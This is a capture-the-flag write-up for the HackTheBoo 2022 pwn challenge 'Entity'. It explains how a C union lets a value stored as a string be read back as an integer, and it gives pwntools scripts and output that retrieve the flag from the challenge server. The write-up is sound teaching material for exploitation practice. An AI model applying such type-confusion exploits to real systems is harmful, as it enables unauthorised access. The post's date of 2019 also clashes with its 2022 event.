+++
title = "CTF Writeup - Entity"
date = 2019-11-27
slug = "entity"
authors = ["Inryatt"]
+++


Author: Inryatt

Difficulty: easy

Category: pwn

CTF: HackTheBoo 2022

This writeup has also been published on this cool blog -> [Pengrey's Blog]("www.pengrey.com")

----

On this challenge we are provided with both the executable and the source code file for the challenge - this is a white box challenge. Therefore, no reversing of the binary is needed, as we can understand how it works just from the source code itself.

### Problem analysis

To start off, this is the data structure where the program stores the data we give it, which will be referenced further ahead:

```c
static union {
    unsigned long long integer;
    char string[8];
} DataStore;
```

When connecting to the target machine, this is what we’re presented with:

```c
Something strange is coming out of the TV..

(T)ry to turn it off
(R)un
(C)ry

>>
```

If T or R are selected, this is shown:

```c
This does not seem to work.. (L)ie down or (S)cream
```

(Any input that’s not one of these options will result in the program exiting immediately after a small message.)

Looking at the source code we can see clearly what each option does:

- T → Store a value in DataStore;  In the second option, (L) will store a numeric value and (S) a string.
- R → Will read the value previously stored in DataStore; If (L) is selected it will (try to) read the integer, and if (S) is selected it will attempt to read the string.
- C → If the value stored in the DataStore as the ‘integer’ is `13371337`, it gives the flag. Otherwise, does nothing.

It is interesting to note that the program will not allow us to store directly ‘13371337’ as the integer — getting the flag is not that trivial. Also, very small numbers (Under -**18446744073709551615,** to be precise) will underflow;

<aside>
❓ The variable that stores an integer (T→L options) is an unsigned long long, which has a maximum value of 18446744073709551615;
If we attempt to store a value of -18446744073709551616+x then read it (options R→L), we will obtain a value of x, instead of the large negative number.

</aside>

However, using this method to get the variable to store 13371337 (By trying to store `-18446744073696180278` ) does not work, as it is caught by the program. Nonetheless, it is an interesting quirk.

### The Solution

The big factor that enables this challenge here is the data structure presented above - the DataStore. It is declared as `static union`, which is explained on [this site](https://en.cppreference.com/w/cpp/language/union) as such:

> A union is a special class type that can hold only one of its non-static [data members](https://en.cppreference.com/w/cpp/language/data_members) at a time.
> 

The key here is that the structure holds only one of the elements (Both the elements in it are non-static) at a time. As such, we can get *very* interesting results when storing an integer (Options T→L) and then reading it as if it were a string (R→S options), and vice-versa.

Particularly, by storing a string and then reading it as a numeric value we may even be able to go around the ‘13371337’ restriction and get the flag! For this, some analysis was required. Below are the integer obtained from storing a string and reading as if it were an integer.

| String | Integer |
| --- | --- |
| ‘0’ | 2608 |
| ‘1’ | 2609 |
| ‘2’ | 2610 |
| … | … |
| ‘00’ | 667696 |
| ‘01’ | 667952 |
| ‘02’ | 668208 |
| ‘10’ | 667697 |
|  |  |

| String | Integer |
| --- | --- |
| ‘a’ | 2657 |
| ‘b’ | 2658 |
| ‘c’ | 2659 |
| … | … |
| ‘aa’ | 680289 |
| ‘ab’ | 680545 |
| ‘bb’ | 680546 |
| ‘aaa’ | 174154081 |
| ‘aab’ | 174219617 |

As we can see, the numbers returned are not random, there is a clear pattern and sequence, even if I were not able to discover it. Characters that are sequential get sequential corresponding integers.

Therefore, these cannot be memory addresses or some similar value that’s being fetched, as it wouldn’t be this predictable. 

Now, here we could attempt to bruteforce this until we find the string that would yield us the ‘13371337’ integer via pwntools, but while setting this up, a peculiarity was found.

```bash
└─$ python3 smp.py
[+] Starting local process './entity': pid 45378
b'\nSomething strange is coming out of the TV..\n\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> '
b'\nThis does not seem to work.. (L)ie down or (S)cream\n\n>> '
b'\nMaybe try a ritual?\n\n>> '
b'\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> '
b'\nThis does not seem to work.. (L)ie down or (S)cream\n\n>> '
b'\nAnything else to try?\n\n>> '
b'123\n\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> '
[*] Stopped process './entity' (pid 45378)
```

```python
from pwn import *
conn = process("./entity")
# Store a string in the DataStore
print(conn.recvuntil(b'>> '))
conn.send(b'T\r\n')
print(conn.recvuntil(b'>> '))
conn.send(b'S\r\n')
print(conn.recvuntil(b'>> '))
# send bytes here
conn.send(p64(123))
conn.send(b'\r\n')
# Read the previously sent string as if it were an integer
print(conn.recvuntil(b'>> '))
conn.send(b'R\r\n')
print(conn.recvuntil(b'>> '))
conn.send(b'L\r\n')
print(conn.recvuntil(b'>> '))
print(conn.recvuntil(b'>> '))
```

If instead of a string (Ex: “123” or b”123”, which is what is sent by typing on the terminal) instead we send a 64-bits integer (Since an unsigned long long, which is what the DataStore uses, is (at least) a 64-bits integer), the output when reading the integer from the DataStore is exactly what we stored as a “string”. Thus, we can get our flag by just sending 13371337.

```bash
└─$ python3 pwnthis.py
[+] Opening connection to 142.93.44.104 on port 32124: Done
b'\nSomething strange is coming out of the TV..\n\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> '
b'\nThis does not seem to work.. (L)ie down or (S)cream\n\n>> '
b'\nMaybe try a ritual?\n\n>> '
b'\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> '
b'\nThis does not seem to work.. (L)ie down or (S)cream\n\n>> '
b'\nAnything else to try?\n\n>> '
b'13371337\n\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> '
b'HTB{f1ght_34ch_3nt1ty_45_4_un10n}'
[*] Closed connection to 142.93.44.104 port 32124
```

```bash
from pwn import *
#conn = process("./entity")
conn = remote("142.93.44.104", 32124)
# Store a string in the DataStore
print(conn.recvuntil(b'>> '))
conn.send(b'T\r\n')
print(conn.recvuntil(b'>> '))
conn.send(b'S\r\n')
print(conn.recvuntil(b'>> '))
# send bytes here
conn.send(p64(13371337))
conn.send(b'\r\n')
print(conn.recvuntil(b'>> '))
conn.send(b'R\r\n')
print(conn.recvuntil(b'>> '))
conn.send(b'L\r\n')
print(conn.recvuntil(b'>> '))
print(conn.recvuntil(b'>> '))
conn.send(b'C\r\n')
print(conn.recvuntil(b'}'))
```